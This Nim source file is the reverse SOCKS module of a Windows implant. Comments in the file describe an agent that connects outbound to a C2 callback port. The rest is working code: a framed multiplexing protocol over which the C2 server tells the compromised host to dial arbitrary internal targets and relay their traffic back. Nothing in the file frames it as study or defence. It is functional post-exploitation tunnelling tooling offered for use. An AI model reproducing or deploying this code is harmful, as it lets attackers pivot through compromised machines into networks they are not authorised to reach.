## rsocks.nim — Reverse SOCKS mux client.
## Agent connects outbound to C2's callback port.
## Frame protocol: 9-byte header [streamID:u32LE][type:u8][payloadLen:u32LE][payload]
## SYN=1 (C2→agent: dial target), DATA=2, FIN=3, OK=4, ERR=5

import winim/lean
import std/strutils
import config

const MAX_STREAMS = 512
const RS_SYN*  : byte = 1
const RS_DATA* : byte = 2
const RS_FIN*  : byte = 3
const RS_OK*   : byte = 4
const RS_ERR*  : byte = 5

var gRSocksC2     {.volatile.}: SOCKET = INVALID_SOCKET
var gRSocksStop   {.volatile.}: bool   = true
var gRSocksThread: HANDLE = 0

# streamID → target socket (index = sid mod MAX_STREAMS)
var gRSocksStreams:    array[MAX_STREAMS, SOCKET]
var gRSocksStreamIDs: array[MAX_STREAMS, uint32]  # to detect collisions
var gRSocksWriteLock:  CRITICAL_SECTION
var gRSocksStreamLock: CRITICAL_SECTION
var gRSocksLocksInited = false

proc initRSocksLocks*() =
  if not gRSocksLocksInited:
    gRSocksLocksInited = true
    InitializeCriticalSection(addr gRSocksWriteLock)
    InitializeCriticalSection(addr gRSocksStreamLock)
    for i in 0..<MAX_STREAMS:
      gRSocksStreams[i]    = INVALID_SOCKET
      gRSocksStreamIDs[i] = 0xFFFFFFFF'u32

proc parseRSocksHost*(url: string): string =
  var s = url
  if s.startsWith("https://"): s = s[8..^1]
  elif s.startsWith("http://"): s = s[7..^1]
  let si = s.find('/')
  if si >= 0: s = s[0..<si]
  let ci = s.rfind(':')
  if ci >= 0: return s[0..<ci]
  return s

proc rsWriteFrame*(sid: uint32; ft: byte; data: ptr byte; dataLen: int32) =
  var hdr: array[9, byte]
  hdr[0] = byte(sid); hdr[1] = byte(sid shr 8)
  hdr[2] = byte(sid shr 16); hdr[3] = byte(sid shr 24)
  hdr[4] = ft
  let pl = uint32(dataLen)
  hdr[5] = byte(pl); hdr[6] = byte(pl shr 8)
  hdr[7] = byte(pl shr 16); hdr[8] = byte(pl shr 24)
  EnterCriticalSection(addr gRSocksWriteLock)
  let c2 = gRSocksC2
  if c2 != INVALID_SOCKET:
    discard send(c2, cast[ptr char](addr hdr[0]), 9, 0)
    if dataLen > 0 and data != nil:
      discard send(c2, cast[ptr char](data), dataLen, 0)
  LeaveCriticalSection(addr gRSocksWriteLock)

type StreamRelayParam = object
  streamID:   uint32
  targetSock: SOCKET

proc streamRelayProc(p: LPVOID): DWORD {.stdcall.} =
  if p == nil: return 1
  let sp = cast[ptr StreamRelayParam](p)
  let sid    = sp.streamID
  let target = sp.targetSock
  dealloc(p)
  var buf: array[32768, byte]
  while not gRSocksStop:
    let n = recv(target, cast[ptr char](addr buf[0]), int32(32768), 0)
    if n <= 0: break
    rsWriteFrame(sid, RS_DATA, cast[ptr byte](addr buf[0]), n)
  # Clean up stream entry
  EnterCriticalSection(addr gRSocksStreamLock)
  let idx = int(sid mod MAX_STREAMS)
  if gRSocksStreams[idx] == target:
    gRSocksStreams[idx]    = INVALID_SOCKET
    gRSocksStreamIDs[idx]  = 0xFFFFFFFF'u32
  LeaveCriticalSection(addr gRSocksStreamLock)
  discard closesocket(target)
  rsWriteFrame(sid, RS_FIN, nil, 0)
  return 0

type SynParam = object
  streamID: uint32
  target:   array[512, char]

proc synHandlerProc(p: LPVOID): DWORD {.stdcall.} =
  if p == nil: return 1
  let sp  = cast[ptr SynParam](p)
  let sid = sp.streamID
  var targetStr = $cast[cstring](addr sp.target[0])
  dealloc(p)
  let ci = targetStr.rfind(':')
  if ci < 0:
    var errMsg = "invalid target"
    rsWriteFrame(sid, RS_ERR, cast[ptr byte](addr errMsg[0]), int32(errMsg.len))
    return 1
  let hostStr = targetStr[0..<ci]
  let portStr = targetStr[ci+1..^1].strip()
  var portNum = 0
  try: portNum = parseInt(portStr) except: discard
  if portNum <= 0 or portNum > 65535:
    var errMsg = "invalid port: " & portStr
    rsWriteFrame(sid, RS_ERR, cast[ptr byte](addr errMsg[0]), int32(errMsg.len))
    return 1
  var wsaData: WSADATA
  discard WSAStartup(WORD(0x0202), addr wsaData)
  let tSock = socket(int32(AF_INET), int32(SOCK_STREAM), int32(IPPROTO_TCP))
  if tSock == INVALID_SOCKET:
    var errMsg = "socket() failed"
    rsWriteFrame(sid, RS_ERR, cast[ptr byte](addr errMsg[0]), int32(errMsg.len))
    return 1
  var saddr: sockaddr_in
  saddr.sin_family = int16(AF_INET)
  saddr.sin_port   = htons(uint16(portNum))
  var hostCS = hostStr & "\x00"
  let ipAddr = inet_addr(addr hostCS[0])
  if ipAddr == INADDR_NONE:
    let he = gethostbyname(addr hostCS[0])
    if he == nil or he.h_addr_list == nil or he.h_addr_list[] == nil:
      discard closesocket(tSock)
      var errMsg = "resolve failed: " & hostStr
      rsWriteFrame(sid, RS_ERR, cast[ptr byte](addr errMsg[0]), int32(errMsg.len))
      return 1
    saddr.sin_addr.S_addr = cast[ptr int32](he.h_addr_list[])[]
  else:
    saddr.sin_addr.S_addr = ipAddr
  if connect(tSock, cast[ptr sockaddr](addr saddr), int32(sizeof(saddr))) != 0:
    discard closesocket(tSock)
    var errMsg = "connect failed: " & hostStr & ":" & portStr
    rsWriteFrame(sid, RS_ERR, cast[ptr byte](addr errMsg[0]), int32(errMsg.len))
    return 1
  let idx = int(sid mod MAX_STREAMS)
  EnterCriticalSection(addr gRSocksStreamLock)
  gRSocksStreams[idx]   = tSock
  gRSocksStreamIDs[idx] = sid
  LeaveCriticalSection(addr gRSocksStreamLock)
  rsWriteFrame(sid, RS_OK, nil, 0)
  let rp = cast[ptr StreamRelayParam](alloc0(sizeof(StreamRelayParam)))
  rp.streamID   = sid
  rp.targetSock = tSock
  var rtid: DWORD = 0
  discard CloseHandle(CreateThread(nil, 0, streamRelayProc, cast[LPVOID](rp), 0, addr rtid))
  return 0

proc recvExactRS(sock: SOCKET; buf: ptr byte; n: int): bool =
  var got = 0
  while got < n:
    let r = recv(sock, cast[ptr char](cast[int](buf) + got), int32(n - got), 0)
    if r <= 0: return false
    got += r
  return true

proc rsocksMainProc(p: LPVOID): DWORD {.stdcall.} =
  var hdr: array[9, byte]
  while not gRSocksStop:
    if not recvExactRS(gRSocksC2, cast[ptr byte](addr hdr[0]), 9): break
    let sid = uint32(hdr[0]) or (uint32(hdr[1]) shl 8) or
              (uint32(hdr[2]) shl 16) or (uint32(hdr[3]) shl 24)
    let ft     = hdr[4]
    let payLen = int(uint32(hdr[5]) or (uint32(hdr[6]) shl 8) or
                     (uint32(hdr[7]) shl 16) or (uint32(hdr[8]) shl 24))
    var payload: pointer = nil
    if payLen > 0:
      payload = alloc0(payLen + 1)
      if not recvExactRS(gRSocksC2, cast[ptr byte](payload), payLen):
        dealloc(payload)
        break
    case ft
    of RS_SYN:
      let sp = cast[ptr SynParam](alloc0(sizeof(SynParam)))
      sp.streamID = sid
      let tlen = min(payLen, 511)
      if tlen > 0 and payload != nil:
        copyMem(addr sp.target[0], payload, tlen)
      sp.target[tlen] = '\0'
      if payload != nil: dealloc(payload); payload = nil
      var stid: DWORD = 0
      discard CloseHandle(CreateThread(nil, 0, synHandlerProc, cast[LPVOID](sp), 0, addr stid))
    of RS_DATA:
      let idx = int(sid mod MAX_STREAMS)
      EnterCriticalSection(addr gRSocksStreamLock)
      let tSock = gRSocksStreams[idx]
      LeaveCriticalSection(addr gRSocksStreamLock)
      if tSock != INVALID_SOCKET and payLen > 0 and payload != nil:
        discard send(tSock, cast[ptr char](payload), int32(payLen), 0)
    of RS_FIN:
      let idx = int(sid mod MAX_STREAMS)
      EnterCriticalSection(addr gRSocksStreamLock)
      let tSock = gRSocksStreams[idx]
      if tSock != INVALID_SOCKET and gRSocksStreamIDs[idx] == sid:
        gRSocksStreams[idx]   = INVALID_SOCKET
        gRSocksStreamIDs[idx] = 0xFFFFFFFF'u32
        discard closesocket(tSock)
      LeaveCriticalSection(addr gRSocksStreamLock)
    else: discard
    if payload != nil: dealloc(payload)
  # Cleanup
  gRSocksStop = true
  EnterCriticalSection(addr gRSocksStreamLock)
  for i in 0..<MAX_STREAMS:
    if gRSocksStreams[i] != INVALID_SOCKET:
      discard closesocket(gRSocksStreams[i])
      gRSocksStreams[i]    = INVALID_SOCKET
      gRSocksStreamIDs[i]  = 0xFFFFFFFF'u32
  LeaveCriticalSection(addr gRSocksStreamLock)
  if gRSocksC2 != INVALID_SOCKET:
    discard closesocket(gRSocksC2)
    gRSocksC2 = INVALID_SOCKET
  return 0

proc startRSocks*(callbackPort: string): string =
  initRSocksLocks()
  if not gRSocksStop or gRSocksC2 != INVALID_SOCKET:
    return "[-] rsocks already running"
  let host = parseRSocksHost(ServerUrl)
  if host == "": return "[-] rsocks: cannot determine C2 host from ServerUrl"
  var portNum = 0
  try: portNum = parseInt(callbackPort.strip()) except: discard
  if portNum <= 0 or portNum > 65535:
    return "[-] rsocks: invalid port: " & callbackPort
  var wsaData: WSADATA
  discard WSAStartup(WORD(0x0202), addr wsaData)
  let sock = socket(int32(AF_INET), int32(SOCK_STREAM), int32(IPPROTO_TCP))
  if sock == INVALID_SOCKET: return "[-] rsocks: socket() failed"
  var saddr: sockaddr_in
  saddr.sin_family = int16(AF_INET)
  saddr.sin_port   = htons(uint16(portNum))
  var hostCS = host & "\x00"
  let ipAddr = inet_addr(addr hostCS[0])
  if ipAddr == INADDR_NONE:
    let he = gethostbyname(addr hostCS[0])
    if he == nil or he.h_addr_list == nil or he.h_addr_list[] == nil:
      discard closesocket(sock)
      return "[-] rsocks: resolve failed: " & host
    saddr.sin_addr.S_addr = cast[ptr int32](he.h_addr_list[])[]
  else:
    saddr.sin_addr.S_addr = ipAddr
  if connect(sock, cast[ptr sockaddr](addr saddr), int32(sizeof(saddr))) != 0:
    discard closesocket(sock)
    return "[-] rsocks: connect " & host & ":" & callbackPort & " failed (err " & $WSAGetLastError() & ")"
  gRSocksC2   = sock
  gRSocksStop = false
  var tid: DWORD = 0
  gRSocksThread = CreateThread(nil, 0, rsocksMainProc, nil, 0, addr tid)
  if gRSocksThread == 0:
    gRSocksStop = true
    discard closesocket(sock)
    gRSocksC2 = INVALID_SOCKET
    return "[-] rsocks: CreateThread failed"
  return "[+] rsocks connected to " & host & ":" & callbackPort

proc stopRSocks*(): string =
  if gRSocksStop and gRSocksC2 == INVALID_SOCKET:
    return "[-] rsocks: not running"
  gRSocksStop = true
  if gRSocksC2 != INVALID_SOCKET:
    discard closesocket(gRSocksC2)
  if gRSocksThread != 0:
    discard WaitForSingleObject(gRSocksThread, DWORD(3000))
    discard CloseHandle(gRSocksThread)
    gRSocksThread = 0
  return "[+] rsocks stopped"
